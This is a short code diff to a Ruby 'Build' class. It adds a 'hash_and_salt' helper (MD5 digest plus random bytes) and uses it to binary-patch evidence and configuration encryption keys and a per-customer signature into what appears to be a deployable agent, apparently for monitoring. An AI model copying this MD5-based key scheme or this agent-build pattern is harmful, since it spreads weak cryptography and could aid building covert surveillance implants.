@@ -89,10 +89,9 @@ class Build
     FileUtils.rm_rf @core_filepath
   end
 
-  # TODO
-  # def hash_and_salt value
-  #   Digest::MD5.digest(value) + SecureRandom.random_bytes(16)
-  # end
+  def hash_and_salt value
+    Digest::MD5.digest(value) + SecureRandom.random_bytes(16)
+  end
 
   def patch(params)
     # skip the phase if not needed
@@ -106,7 +105,7 @@ class Build
 
     # evidence encryption key
     begin
-      key = Digest::MD5.digest(@factory.logkey) + SecureRandom.random_bytes(16)
+      key = hash_and_salt @factory.logkey
       content.binary_patch 'WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg', key
     rescue
       raise "Evidence key marker not found"
@@ -114,7 +113,7 @@ class Build
 
     # conf encryption key
     begin
-      key = Digest::MD5.digest(@factory.confkey) + SecureRandom.random_bytes(16)
+      key = hash_and_salt @factory.confkey
       content.binary_patch '6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY', key
     rescue
       raise "Config key marker not found"
@@ -123,7 +122,7 @@ class Build
     # per-customer signature
     begin
       sign = ::Signature.where({scope: 'agent'}).first
-      signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
+      signature = hash_and_salt sign.value
 
       marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
       magic = license_magic + marker.slice(8..-1)
